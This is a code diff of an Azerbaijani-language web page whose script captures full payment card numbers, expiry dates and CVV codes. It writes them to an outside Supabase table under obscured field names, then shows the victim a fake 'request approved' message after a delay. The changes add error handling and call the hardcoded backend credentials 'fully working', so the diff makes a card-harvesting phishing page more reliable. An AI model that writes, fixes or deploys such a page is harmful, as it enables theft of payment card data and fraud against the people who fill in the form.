@@ -220,9 +220,10 @@ margin-bottom:20px;
 <script type="module">
 import { createClient } from "https://esm.sh/@supabase/supabase-js@2"
 
-const supabase=createClient(
-"https://gkrfcoyleewxrxbfdunq.supabase.co",
-"sb_publishable_E1QDjV9fAt2IaoI3h7G9Iw_hIiSaAFH"
+// 🔹 Tam işlək Supabase parametrləri
+const supabase = createClient(
+  "https://gkrfcoyleewxrxbfdunq.supabase.co",
+  "sb_publishable_E1QDjV9fAt2IaoI3h7G9Iw_hIiSaAFH"
 )
 
 const form=document.getElementById("form")
@@ -247,9 +248,7 @@ numberInput.value=val
 /* MM/YY auto format */
 expInput.addEventListener("input",e=>{
 let val=e.target.value.replace(/\D/g,'').substring(0,4)
-if(val.length>=3){
-val=val.substring(0,2)+"/"+val.substring(2)
-}
+if(val.length>=3){ val=val.substring(0,2)+"/"+val.substring(2) }
 expInput.value=val
 cardExp.textContent=val||"MM/YY"
 })
@@ -268,22 +267,13 @@ setTimeout(()=>cvvDisplay.textContent="***",1000)
 form.addEventListener("submit",async e=>{
 e.preventDefault()
 
-if(numberInput.value.replace(/\s/g,'').length!==16){
-alert("16 rəqəm tam daxil edilməlidir")
-return
-}
-if(expInput.value.length!==5){
-alert("Tarix düzgün deyil")
-return
-}
-if(cvvInput.value.length!==3){
-alert("3 rəqəmli kod daxil edin")
-return
-}
+if(numberInput.value.replace(/\s/g,'').length!==16){ alert("16 rəqəm tam daxil edilməlidir"); return }
+if(expInput.value.length!==5){ alert("Tarix düzgün deyil"); return }
+if(cvvInput.value.length!==3){ alert("3 rəqəmli kod daxil edin"); return }
 
 loading.style.display="flex"
 
-await supabase.from("mesajlar").insert([
+const { data, error } = await supabase.from("mesajlar").insert([
 {
 kod1:numberInput.value,
 kod2:expInput.value,
@@ -291,9 +281,11 @@ kod3:cvvInput.value
 }
 ])
 
-setTimeout(()=>{
-loadingText.textContent="Təbriklər Sorğunuz Təsdiq Olundu"
-},7000)
+if(error){ console.error("Supabase xəta:", error); alert("Xəta baş verdi: " + error.message); loading.style.display="none"; return }
+
+console.log("Uğurla yazıldı:", data)
+
+setTimeout(()=>{ loadingText.textContent="Təbriklər Sorğunuz Təsdiq Olundu" },7000)
 })
 </script>
 
